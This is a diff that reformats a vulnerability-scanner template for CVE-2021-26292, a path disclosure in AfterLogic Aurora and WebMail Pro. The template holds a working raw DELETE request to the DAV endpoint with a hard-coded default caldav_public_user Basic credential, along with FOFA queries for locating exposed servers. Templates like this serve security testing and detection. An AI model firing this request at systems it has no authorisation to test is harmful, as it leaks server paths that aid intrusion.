@@ -1,5 +1,4 @@
 id: afterlogic-path-disclosure
-
 info:
   name: AfterLogic Aurora and WebMail Pro < 7.7.9 - Full Path Disclosure
   author: johnk3r
@@ -14,22 +13,20 @@ info:
     - https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26292-full-path-disclosure-vulnerability.md
     - https://nvd.nist.gov/vuln/detail/CVE-2021-26292
   metadata:
-    verified: true
-    max-request: 1
-    vendor: AfterLogic
-    product: AfterLogic Aurora & WebMail
     fofa-query:
       - "X-Server: AfterlogicDAVServer"
       - "x-server: afterlogicdavserver"
-  tags: afterlogic,path,disclosure,AfterLogic,vuln
-
+    max-request: 1
+    product: AfterLogic Aurora & WebMail
+    vendor: AfterLogic
+    verified: true
+  tags: AfterLogic,afterlogic,disclosure,path,vuln
 http:
   - raw:
       - |
         DELETE /dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021 HTTP/1.1
         Host: {{Hostname}}
         Authorization: Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI
-
     matchers-condition: and
     matchers:
       - type: word
@@ -38,13 +35,11 @@ http:
           - "caldav_public_user"
           - "GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"
         condition: and
-
       - type: word
         part: header
         words:
           - "application/xml"
-
       - type: status
         status:
           - 404
-# digest: 490a00463044022079926f938dfc6e0805133a0c0b364ed55a725b069907ce77d644e35c7256cb0a02206699206a5cacefdfb8a142c64da562168482427f5d5b59673b20cbf9b6e70b6b:922c64590222798bb761d5b6d8e72950
+        # digest: 490a00463044022079926f938dfc6e0805133a0c0b364ed55a725b069907ce77d644e35c7256cb0a02206699206a5cacefdfb8a142c64da562168482427f5d5b59673b20cbf9b6e70b6b:922c64590222798bb761d5b6d8e72950
